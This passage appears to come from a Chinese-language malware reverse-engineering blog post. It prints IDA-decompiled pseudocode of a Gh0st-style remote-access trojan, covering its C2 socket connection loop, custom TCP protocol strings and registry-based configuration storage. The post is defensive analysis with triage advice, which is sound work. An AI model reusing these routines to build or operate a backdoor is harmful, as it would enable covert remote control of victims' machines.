class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">char __fastcall cyber(char *ArgList, LPCWCH lpWideCharStr, u_short hostshort)</span><br><span class="line">&#123;</span><br><span class="line">  // ArgList: 指向一个结构体的指针，用于存储连接状态和句柄。</span><br><span class="line">  // lpWideCharStr: 指向宽字符字符串 (Unicode)，包含目标 HOSTNAME（主机名）。</span><br><span class="line">  // hostshort: 目标 PORT（端口号），为主机字节序。</span><br><span class="line">  SOCKET v6; // 用于存储新的套接字句柄</span><br><span class="line">  // ... 其他局部变量</span><br><span class="line"></span><br><span class="line">  // --- 状态初始化和重置 ---</span><br><span class="line">  ResetEvent(*((HANDLE *)ArgList + 1)); // 重置 ArgList 结构体中的一个同步事件句柄</span><br><span class="line">  _InterlockedExchange((volatile __int32 *)ArgList + 8, 0); // 原子地设置 ArgList 中偏移量 +8 处的标志为 0 (例如：连接状态为“正在连接”)</span><br><span class="line">  *((_DWORD *)ArgList + 7) = timeGetTime(); // 记录当前时间 (偏移量 +7)</span><br><span class="line">  // ... ArgList 结构体的其他初始化和设置</span><br><span class="line"></span><br><span class="line">  // --- 1. 创建套接字 (Socket) ---</span><br><span class="line">  v6 = socket(2, 1, 6); // 创建新的套接字：AF_INET (2, IPv4), SOCK_STREAM (1, TCP流), IPPROTO_TCP (6) -&gt; TCP/IPv4</span><br><span class="line">  *((_QWORD *)ArgList + 22) = v6; // 将新的套接字句柄存储在 ArgList 结构体的偏移量 +22 处</span><br><span class="line">  if ( v6 == -1 ) // 检查套接字创建是否失败</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">  // --- 2. 转换主机名 (宽字符到多字节) ---</span><br><span class="line">  cchWideChar = lstrlenW(lpWideCharStr); // 获取宽字符主机名字符串的长度</span><br><span class="line">  // 确定多字节字符串所需的缓冲区大小</span><br><span class="line">  cbMultiByte_1 = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, 0, 0, 0, 0); </span><br><span class="line">  cbMultiByte = cbMultiByte_1;</span><br><span class="line">  lpMultiByteStr = (CHAR *)operator new(cbMultiByte_1 + 1); // 分配内存用于多字节字符串 (+1 用于空终止符)</span><br><span class="line">  cchWideChar_1 = lstrlenW(lpWideCharStr);</span><br><span class="line">  // 执行实际的转换：从宽字符到多字节</span><br><span class="line">  WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar_1, lpMultiByteStr, cbMultiByte, 0, 0); </span><br><span class="line">  lpMultiByteStr[cbMultiByte] = 0; // 空终止多字节字符串</span><br><span class="line"></span><br><span class="line">  // --- 3. 解析主机名到 IP 地址 (DNS Lookup) ---</span><br><span class="line">  hostbyname = gethostbyname(lpMultiByteStr); // 执行 DNS 查询，将主机名解析为 IP 地址</span><br><span class="line">  j_free(lpMultiByteStr); // 释放分配的多字节字符串缓冲区</span><br><span class="line">  if ( !hostbyname ) // 检查 DNS 解析是否失败</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">  // --- 4. 准备目标地址结构体 (sockaddr_in) ---</span><br><span class="line">  name.sa_family = 2; // 设置地址族为 AF_INET (IPv4)</span><br><span class="line">  // 设置端口号：将 hostshort (主机字节序) 转换为网络字节序</span><br><span class="line">  *(_WORD *)name.sa_data = htons(hostshort); </span><br><span class="line">  s = *((_QWORD *)ArgList + 22); // 获取套接字句柄</span><br><span class="line">  // 设置 IP 地址：获取 h_addr_list 指针数组中的第一个地址</span><br><span class="line">  *(_DWORD *)&amp;name.sa_data[2] = **(_DWORD **)hostbyname-&gt;h_addr_list; </span><br><span class="line"></span><br><span class="line">  // --- 5. 建立连接 (TCP Handshake) ---</span><br><span class="line">  if ( connect(s, &amp;name, 16) == -1 ) // 尝试建立 TCP 连接</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">  // --- 6. 配置套接字选项 (setsockopt) ---</span><br><span class="line">  // 设置 SO_RCVBUF (接收缓冲区大小, 4097) 为 0x40000 (256 KB)</span><br><span class="line">  s_1 = *((_QWORD *)ArgList + 22);</span><br><span class="line">  *(_DWORD *)optval = 0x40000;</span><br><span class="line">  setsockopt(s_1, 0xFFFF, 4097, optval, 4); // 0xFFFF 是 SOL_SOCKET (套接字级别)</span><br><span class="line"></span><br><span class="line">  // 设置 SO_SNDBUF (发送缓冲区大小, 4098) 为 0x40000 (256 KB)</span><br><span class="line">  s_2 = *((_QWORD *)ArgList + 22);</span><br><span class="line">  *(_DWORD *)optval = 0x40000;</span><br><span class="line">  setsockopt(s_2, 0xFFFF, 4098, optval, 4);</span><br><span class="line"></span><br><span class="line">  // 设置 SO_SNDTIMEO (发送超时, 4102) 为 30000 毫秒 (30 秒)</span><br><span class="line">  s_3 = *((_QWORD *)ArgList + 22);</span><br><span class="line">  *(_DWORD *)optval_ = 30000;</span><br><span class="line">  setsockopt(s_3, 0xFFFF, 4102, optval_, 4);</span><br><span class="line"></span><br><span class="line">  // 设置 SO_KEEPALIVE (启用保持活动机制, 8) 为 1</span><br><span class="line">  s_5 = *((_QWORD *)ArgList + 22);</span><br><span class="line">  *(_DWORD *)optval__1 = 1;</span><br><span class="line">  if ( !setsockopt(s_5, 0xFFFF, 8, optval__1, 4) )</span><br><span class="line">  &#123;</span><br><span class="line">    // 如果 SO_KEEPALIVE 设置成功，则配置 Keep-Alive 定时参数</span><br><span class="line">    s_4 = *((_QWORD *)ArgList + 22);</span><br><span class="line">    vInBuffer[0] = 1;       // 开关 (1: 启用)</span><br><span class="line">    vInBuffer[1] = 180000;  // 保持活动时间 (180 秒 或 3 分钟)</span><br><span class="line">    vInBuffer[2] = 5000;    // 保持活动间隔 (5 秒)</span><br><span class="line">    // 使用 WSAIoctl 和 SIO_KEEPALIVE_VALS (0x98000004) 设置自定义 Keep-Alive 参数</span><br><span class="line">    WSAIoctl(s_4, 0x98000004, vInBuffer, 0xCu, 0, 0, &amp;cbBytesReturned, 0, 0); </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // --- 7. 更新状态并创建工作线程 ---</span><br><span class="line">  _InterlockedExchange((volatile __int32 *)ArgList + 8, 1); // 原子地设置连接状态标志为 1 (例如：已连接)</span><br><span class="line">  ThrdAddr = 0;</span><br><span class="line">  // 创建一个线程 (例如：接收/读取线程)</span><br><span class="line">  *((_QWORD *)ArgList + 20) = beginthreadex(0, 0, sub_140003690, ArgList, 0, &amp;ThrdAddr); </span><br><span class="line">  ThrdAddr_ = 0;</span><br><span class="line">  // 创建第二个线程 (例如：发送/写入线程或心跳线程)</span><br><span class="line">  *((_QWORD *)ArgList + 21) = beginthreadex(0, 0, sub_1400037E0, ArgList, 0, &amp;ThrdAddr_); </span><br><span class="line">  return 1; // 成功</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sub_140003390</code>函数是 Windows 环境中建立<strong>出站 TCP 网络连接</strong>的常见模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过 *(_WORD *)name.sa_data = htons(hostshort); 将其转换为网络字节序并设置为socket连接端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">name.sa_family = 2; // AF_INET</span><br><span class="line">*(_WORD *)name.sa_data = htons(hostshort); // 端口号 (网络字节序)</span><br><span class="line">*(_DWORD *)&amp;name.sa_data[2] = **(_DWORD **)hostbyname-&gt;h_addr_list; // IP地址</span><br><span class="line">// Hidden C++ exception states: #wind=2</span><br><span class="line">void __fastcall __noreturn sub_7FF6175EA440(LPVOID lpThreadParameter)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // eax</span><br><span class="line">  __int64 v2; // rdi</span><br><span class="line">  void *v3; // rax</span><br><span class="line">  __int64 v4; // rbp</span><br><span class="line">  void *v5; // rax</span><br><span class="line">  __int64 v6; // rsi</span><br><span class="line">  int v7; // r11d</span><br><span class="line">  int v8; // eax</span><br><span class="line">  void (__fastcall **v9)(_QWORD); // rbx</span><br><span class="line">  unsigned int v10; // eax</span><br><span class="line">  int v11; // ebx</span><br><span class="line">  _QWORD v12[2]; // [rsp+38h] [rbp-60h] BYREF</span><br><span class="line">  int v13; // [rsp+48h] [rbp-50h]</span><br><span class="line">  HANDLE hObject; // [rsp+50h] [rbp-48h]</span><br><span class="line">  int v15; // [rsp+60h] [rbp-38h]</span><br><span class="line">  HANDLE hHandle; // [rsp+68h] [rbp-30h]</span><br><span class="line">  void *v17; // [rsp+A8h] [rbp+10h] BYREF</span><br><span class="line"></span><br><span class="line">  CreateThread(0, 0, StartAddress, 0, 0, 0);</span><br><span class="line">  CreateThread(0, 0, sub_7FF6175EA3E0, 0, 0, 0);</span><br><span class="line">  v1 = sub_7FF6175EC5F8(&amp;unk_7FF61763FB2C);</span><br><span class="line">  Sleep(1000 * v1);</span><br><span class="line">  v2 = 0;</span><br><span class="line">  v3 = operator new(0xB8u);</span><br><span class="line">  if ( v3 )</span><br><span class="line">    v4 = sub_7FF6175E3230(v3);</span><br><span class="line">  else</span><br><span class="line">    v4 = 0;</span><br><span class="line">  v5 = operator new(0x368u);</span><br><span class="line">  v17 = v5;</span><br><span class="line">  if ( v5 )</span><br><span class="line">    v6 = sub_7FF6175E7690(v5);</span><br><span class="line">  else</span><br><span class="line">    v6 = 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF6175E3210();</span><br><span class="line">    if ( byte_7FF61763E99E )</span><br><span class="line">    &#123;</span><br><span class="line">      wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;);   // &quot;127.0.0.1&quot;</span><br><span class="line">      wcscpy_s(a6666, 0x1Eu, L&quot;8888&quot;);          // &quot;6666&quot;</span><br><span class="line">      v7 = dword_7FF61763F8E8;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;);   // &quot;127.0.0.1&quot;</span><br><span class="line">      wcscpy_s(a6666, 0x1Eu, L&quot;6666&quot;);          // &quot;6666&quot;</span><br><span class="line">      v7 = dword_7FF61763F6A8;</span><br><span class="line">    &#125;</span><br><span class="line">    byte_7FF61763E99E = byte_7FF61763E99E == 0;</span><br><span class="line">    dword_7FF61763E550 = v7;</span><br><span class="line">    if ( ++dword_7FF61763F3F4 == 200 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_7FF6175E3210();</span><br><span class="line">      wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;);   // &quot;127.0.0.1&quot;</span><br><span class="line">      wcscpy_s(a6666, 0x1Eu, L&quot;80&quot;);            // &quot;6666&quot;</span><br><span class="line">      v7 = dword_7FF61763FB28;</span><br><span class="line">      dword_7FF61763E550 = dword_7FF61763FB28;</span><br><span class="line">      dword_7FF61763F3F4 = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      (**(void (__fastcall ***)(__int64))v2)(v2);</span><br><span class="line">      v7 = dword_7FF61763E550;</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = v6;</span><br><span class="line">    if ( v7 == 1 )</span><br><span class="line">      v2 = v4;</span><br><span class="line">    v8 = sub_7FF6175EC5F8(&amp;unk_7FF61763FB68);</span><br><span class="line">    Sleep(1000 * v8);</span><br><span class="line">    v9 = *(void (__fastcall ***)(_QWORD))v2;</span><br><span class="line">    v10 = sub_7FF6175EC5F8(a6666);              // &quot;6666&quot;</span><br><span class="line">    if ( ((unsigned __int8 (__fastcall *)(__int64, wchar_t *, _QWORD))v9[4])(v2, a127001, v10) )// &quot;127.0.0.1&quot;</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = dword_7FF61763FCE8;</span><br><span class="line">      v12[0] = &amp;CManager::`vftable&#x27;;</span><br><span class="line">      v12[1] = v2;</span><br><span class="line">      (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v2 + 24LL))(v2, v12);</span><br><span class="line">      hObject = CreateEventA(0, 1, 0, 0);</span><br><span class="line">      v13 = 0;</span><br><span class="line">      v12[0] = &amp;CKernelManager::`vftable&#x27;;</span><br><span class="line">      hHandle = 0;</span><br><span class="line">      v15 = v11;</span><br><span class="line">      LOWORD(v17) = 260;</span><br><span class="line">      (*(void (__fastcall **)(__int64, void **, __int64))(*(_QWORD *)v2 + 16LL))(v2, &amp;v17, 2);</span><br><span class="line">      (*(void (__fastcall **)(__int64))(*(_QWORD *)v2 + 40LL))(v2);</span><br><span class="line">      WaitForSingleObject(hHandle, 0xFFFFFFFF);</span><br><span class="line">      v12[0] = &amp;CKernelManager::`vftable&#x27;;</span><br><span class="line">      CloseHandle(hHandle);</span><br><span class="line">      v12[0] = &amp;CManager::`vftable&#x27;;</span><br><span class="line">      CloseHandle(hObject);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">这是一个无限循环的线程函数 sub_7FF6175EA440 ，负责建立与C&amp;C服务器的连接并执行后续操作。函数使用 __noreturn 声明，表示它永远不会返回</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902222-6d58ab53-2bcf-4935-bcd1-aaa9d2440f14.jpg" alt="null"></p><p>这里发现了一些信息<br>我们copy下来看一下</p><p>这些全是<strong>TCP 协议底层日志</strong>，说明程序不是简单调用系统 TCP 接口，而是实现了自定义的 TCP 通信（常见于木马 &#x2F; 远控程序，用于稳定和控制端交互）</p><table><thead><tr><th>字符串</th><th>含义（通俗解释）</th><th>排查价值</th></tr></thead><tbody><tr><td><code>recv sn=%lu</code></td><td>接收 TCP 数据包，记录「序列号（sn）」</td><td>证明程序在和外部（如黑客服务器）进行 TCP 数据交互，sn 是数据包有序传输的标识</td></tr><tr><td><code>input ack: sn=%lu rtt=%ld rto=%ld</code></td><td>收到 TCP 确认包（ACK），记录序列号、往返时间（rtt）、重传超时（rto）</td><td>木马为了保证 C2 连接稳定，会动态调整 rto（避免连接断开），是主动通信的铁证</td></tr><tr><td><code>input psh: sn=%lu ts=%lu</code></td><td>收到 TCP 推送包（PSH），记录序列号和时间戳（ts）</td><td>PSH 包用于「强制立即传输数据」，常见于黑客发送控制指令、接收窃取数据时</td></tr><tr><td><code>input probe</code></td><td>收到 TCP 探测包</td><td>黑客可能在通过探测包检测你的主机是否在线、连接是否存活</td></tr><tr><td><code>input wins: %lu</code></td><td>记录 TCP 窗口大小（wins）</td><td>优化数据传输效率，进一步证明是「持续双向通信」（而非单次请求）</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">data:000000014001DBB8 aRoLdBytes      db &#x27;[RO] %ld bytes&#x27;,0   ; DATA XREF: sub_140001740+2E↑o</span><br><span class="line">.rdata:000000014001DBB8                                         ; sub_140002880+14A↑o ...</span><br><span class="line">.rdata:000000014001DBC7                 align 8</span><br><span class="line">.rdata:000000014001DBC8 aRecvSnLu       db &#x27;recv sn=%lu&#x27;,0      ; DATA XREF: sub_140001B70+FF↑o</span><br><span class="line">.rdata:000000014001DBD4                 align 8</span><br><span class="line">.rdata:000000014001DBD8 aRiDBytes       db &#x27;[RI] %d bytes&#x27;,0    ; DATA XREF: sub_140002390+3A↑o</span><br><span class="line">.rdata:000000014001DBE6                 align 8</span><br><span class="line">.rdata:000000014001DBE8 aInputAckSnLuRt db &#x27;input ack: sn=%lu rtt=%ld rto=%ld&#x27;,0</span><br><span class="line">.rdata:000000014001DBE8                                         ; DATA XREF: sub_140002390+271↑o</span><br><span class="line">.rdata:000000014001DC0A                 align 10h</span><br><span class="line">.rdata:000000014001DC10 aInputPshSnLuTs db &#x27;input psh: sn=%lu ts=%lu&#x27;,0</span><br><span class="line">.rdata:000000014001DC10                                         ; DATA XREF: sub_140002390+2AE↑o</span><br><span class="line">.rdata:000000014001DC29                 align 10h</span><br><span class="line">.rdata:000000014001DC30 aInputProbe     db &#x27;input probe&#x27;,0      ; DATA XREF: sub_140002390+375↑o</span><br><span class="line">.rdata:000000014001DC3C                 align 20h</span><br><span class="line">.rdata:000000014001DC40 aInputWinsLu    db &#x27;input wins: %lu&#x27;,0  ; DATA XREF: sub_140002390+39E↑o</span><br><span class="line">.rdata:000000014001DC50                 dq offset ??_R4CManager@@6B@ ; const CManager::`RTTI Complete Object Locator&#x27;</span><br><span class="line">.rdata:000000014001DC58 ; const CManager::`vftable&#x27;</span><br><span class="line">.rdata:000000014001DC58 ??_7CManager@@6B@ dq offset nullsub_2   ; DATA XREF: sub_140006E50+27↑o</span><br><span class="line">.rdata:000000014001DC58                                         ; sub_140006EB0+21↑o ...</span><br><span class="line">.rdata:000000014001DC60                 dq offset ??_R4CTcpSocket@@6B@ ; const CTcpSocket::`RTTI Complete Object Locator&#x27;</span><br><span class="line">.rdata:000000014001DC68 ; const CTcpSocket::`vftable&#x27;</span><br><span class="line">.rdata:000000014001DC68 ??_7CTcpSocket@@6B@ dq offset sub_140003310</span><br><span class="line">.rdata:000000014001DC68                                         ; DATA XREF: sub_140003230+21↑o</span><br><span class="line">.rdata:000000014001DC70                 dq offset sub_140005A30</span><br><span class="line">.rdata:000000014001DC78                 dq offset sub_140003860</span><br><span class="line">.rdata:000000014001DC80                 dq offset ?swfun@std@@YAXAEAVios_base@1@_J@Z ; std::swfun(std::ios_base &amp;,__int64)</span><br><span class="line">.rdata:000000014001DC88                 dq offset sub_140003390</span><br><span class="line">.rdata:000000014001DC90                 dq offset sub_140003C10</span><br><span class="line">.rdata:000000014001DC98 unk_14001DC98   db    0                 ; DATA XREF: sub_140009460+61↑o</span><br><span class="line">.rdata:000000014001DC99                 db    0</span><br><span class="line">.rdata:000000014001DC9A                 db    0</span><br><span class="line">.rdata:000000014001DC9B                 db    0</span><br><span class="line">.rdata:000000014001DC9C                 db    0</span><br><span class="line">.rdata:000000014001DC9D                 db    0</span><br><span class="line">.rdata:000000014001DC9E                 db    0</span><br><span class="line">.rdata:000000014001DC9F                 db    0</span><br><span class="line">.rdata:000000014001DCA0 aInvalidStringP db &#x27;invalid string position&#x27;,0</span><br><span class="line">.rdata:000000014001DCA0                                         ; DATA XREF: sub_1400066C0+1C↑o</span><br><span class="line">.rdata:000000014001DCA0                                         ; sub_1400067F0+27↑o ...</span><br><span class="line">.rdata:000000014001DCB8 aStringTooLong  db &#x27;string too long&#x27;,0  ; DATA XREF: sub_1400067F0+71↑o</span><br><span class="line">.rdata:000000014001DCB8                                         ; sub_140006920+8D↑o ...</span><br><span class="line">.rdata:000000014001DCC8                 align 10h</span><br><span class="line">.rdata:000000014001DCD0 ; const WCHAR aD33f351a4aeea5</span><br><span class="line">.rdata:000000014001DCD0 aD33f351a4aeea5:                        ; DATA XREF: sub_140006EF0+8D↑o</span><br><span class="line">.rdata:000000014001DCD0                                         ; sub_140006EF0+F2↑o ...</span><br><span class="line">.rdata:000000014001DCD0                 text &quot;UTF-16LE&quot;, &#x27;d33f351a4aeea5e608853d1a56661059&#x27;,0</span><br><span class="line">.rdata:000000014001DD12                 align 8</span><br><span class="line">.rdata:000000014001DD18 aDenglupeizhi   db &#x27;denglupeizhi&#x27;,0     ; DATA XREF: sub_140007500+23↑o</span><br><span class="line">.rdata:000000014001DD25                 align 8</span><br><span class="line">.rdata:000000014001DD28 ; const WCHAR SubKey</span><br><span class="line">.rdata:000000014001DD28 SubKey:                                 ; DATA XREF: sub_140006D20+40↑o</span><br><span class="line">.rdata:000000014001DD28                 text &quot;UTF-16LE&quot;, &#x27;SOFTWARE&#x27;,0</span><br><span class="line">.rdata:000000014001DD3A                 align 20h</span><br><span class="line">.rdata:000000014001DD40 ; const WCHAR ValueName</span><br><span class="line">.rdata:000000014001DD40 ValueName:                              ; DATA XREF: sub_140006D20+67↑o</span><br><span class="line">.rdata:000000014001DD40                                         ; sub_140006D20+79↑o</span><br><span class="line">.rdata:000000014001DD40                 text &quot;UTF-16LE&quot;, &#x27;IpDates_info&#x27;,0</span><br><span class="line">.rdata:000000014001DD5A                 align 20h</span><br><span class="line">.rdata:000000014001DD60 ; const WCHAR aConsole1</span><br><span class="line">.rdata:000000014001DD60 aConsole1:                              ; DATA XREF: sub_140006EF0+39↑o</span><br><span class="line">.rdata:000000014001DD60                                         ; sub_140006EF0+367↑o</span><br><span class="line">.rdata:000000014001DD60                 text &quot;UTF-16LE&quot;, &#x27;Console\1&#x27;,0</span><br><span class="line">.rdata:000000014001DD74                 align 8</span><br><span class="line">.rdata:000000014001DD78 aWindowsSystem3 db &#x27;Windows\System32\tracerpt.exe&#x27;,0</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902341-4ab60a55-51cc-4e69-8d07-3b895e7e7c13.jpg" alt="null"><br><code>denglupeizhi</code>（中文拼音：「登录配置」）</p><ul><li><p>含义：程序的核心配置项（大概率存储 C2 服务器 IP、端口、登录密码 &#x2F; 密钥）；</p></li><li><p>排查操作：在系统中搜索这个字符串（如注册表、本地配置文件），可能找到明文 &#x2F; 加密的 C2 配置。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_140007500(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // r10d</span><br><span class="line">  __int64 v2; // r9</span><br><span class="line">  int n12_1; // r8d</span><br><span class="line">  __int64 n12; // rdx</span><br><span class="line"></span><br><span class="line">  v1 = 0;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  if ( a1 &lt;= 0 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    n12_1 = 0;</span><br><span class="line">    for ( n12 = 0; n12 &lt; 12; ++n12 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *((_BYTE *)lpBuffer + v2 + n12) != aDenglupeizhi[n12] )</span><br><span class="line">        break;</span><br><span class="line">      ++n12_1;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( n12_1 == 12 )</span><br><span class="line">      break;</span><br><span class="line">    ++v2;</span><br><span class="line">    ++v1;</span><br><span class="line">    if ( v2 &gt;= a1 )</span><br><span class="line">      return 0xFFFFFFFFLL;</span><br><span class="line">  &#125;</span><br><span class="line">  return v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数也挺关键的</p><p>然后xfer到下面这个函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_140006D20(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v2; // eax</span><br><span class="line">  HANDLE hProcess; // rax</span><br><span class="line">  _QWORD v5[2]; // [rsp+30h] [rbp-28h] BYREF</span><br><span class="line">  DWORD dwProcessId[6]; // [rsp+40h] [rbp-18h]</span><br><span class="line">  DWORD ExitCode; // [rsp+60h] [rbp+8h] BYREF</span><br><span class="line">  HKEY hKey; // [rsp+68h] [rbp+10h] BYREF</span><br><span class="line"></span><br><span class="line">  v2 = sub_140007500(dword_14005EBB8);</span><br><span class="line">  if ( v2 != -1 )</span><br><span class="line">    memmove((char *)lpBuffer + v2, &amp;Src, 0x12A0u);</span><br><span class="line">  RegOpenKeyExW(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE&quot;, 0, 0x102u, &amp;hKey);</span><br><span class="line">  RegDeleteValueW(hKey, L&quot;IpDates_info&quot;);</span><br><span class="line">  RegSetValueExW(hKey, L&quot;IpDates_info&quot;, 0, 3u, &amp;Src, 0x12A0u);</span><br><span class="line">  RegCloseKey(hKey);</span><br><span class="line">  if ( a1[10] )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[0] = 0;</span><br><span class="line">    v5[1] = 0;</span><br><span class="line">    *(_QWORD *)dwProcessId = 0;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( !(unsigned int)sub_140007310((unsigned int)dword_14005EBB8, v5) )</span><br><span class="line">        ;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        hProcess = OpenProcess(0x400u, 0, dwProcessId[0]);</span><br><span class="line">        if ( !hProcess || !GetExitCodeProcess(hProcess, 